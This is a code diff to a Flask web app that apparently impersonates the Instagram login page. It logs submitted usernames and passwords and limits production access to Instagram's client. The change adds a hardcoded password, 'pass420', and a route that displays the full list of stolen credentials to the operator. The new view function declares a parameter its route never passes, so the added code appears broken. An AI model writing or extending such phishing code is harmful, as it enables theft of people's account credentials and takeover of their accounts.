@@ -1,5 +1,5 @@
 from flask import Flask, request, render_template, redirect, abort
-from credentials_logger import log_credentials
+from credentials_logger import log_credentials, get_credentials
 
 
 app = Flask(__name__)
@@ -8,6 +8,9 @@ if app.debug:               # If we're testing, allow connections from any usera
     INSTAGRAM_USERAGENT_SIGNATURE = ""
 else:                       # If we're in production mode, only allow connections from the Instagram web client
     INSTAGRAM_USERAGENT_SIGNATURE = "Instagram"
+
+
+PASSWORD = 'pass420'
 
 
 @app.route('/login', methods=['POST'])
@@ -27,6 +30,11 @@ def login_page(p: str=None):
         return render_template('instagram-login.html')
     else:
         abort(404)
+
+
+@app.route('/credentials/' + PASSWORD)
+def credentials(password: str):
+    return render_template('credentials.html', credentials_list=get_credentials())
 
 
 if __name__ == '__main__':
